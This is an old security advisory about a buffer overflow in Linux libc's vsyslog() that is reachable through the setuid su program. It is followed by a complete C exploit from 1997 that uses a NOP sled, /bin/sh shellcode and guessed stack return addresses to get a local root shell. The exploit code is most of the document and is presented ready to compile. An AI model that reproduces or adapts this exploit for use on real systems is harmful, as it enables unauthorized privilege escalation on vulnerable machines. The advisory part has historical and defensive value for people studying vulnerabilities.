source: http://www.securityfocus.com/bid/475/info

A buffer overflow is present in linux libc 5.4.32 and below that allows a user to obtain local root access under some conditions. The overflow is in the function vsyslog() and exploitable through the suid root program su, which passes the arg that exceeds boundaries directly to the function. The consequences of this problem being exploited that particular way are allowing a user to execute arbitrary code and gain root access.

/*
vsyslog()/openlog() exploit by BiT - 8/8 1997
Greets to: doodle, skaut, melon, kweiheri etc.
*/

#include <stdlib.h>
#include <unistd.h>

unsigned long get_esp(void)
{
__asm__("movl %esp, %eax");
}

void main(int argc, char **argv)
{
unsigned char shell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff_bin_sh";
char *buf,*p;
unsigned long *adr;
int i;
if((p=buf=malloc(2028+28)) == NULL)
exit(-1);
memset(p,0x90,2028);
p+=2028-strlen(shell);
for(i=0;i<strlen(shell);i++)
*p++=shell[i];
adr=(long *)p;
for(i=0;i<7;i++)
*adr++=get_esp();
p=(char *)adr;
*p=0;
execl("/bin/su",buf,NULL);
}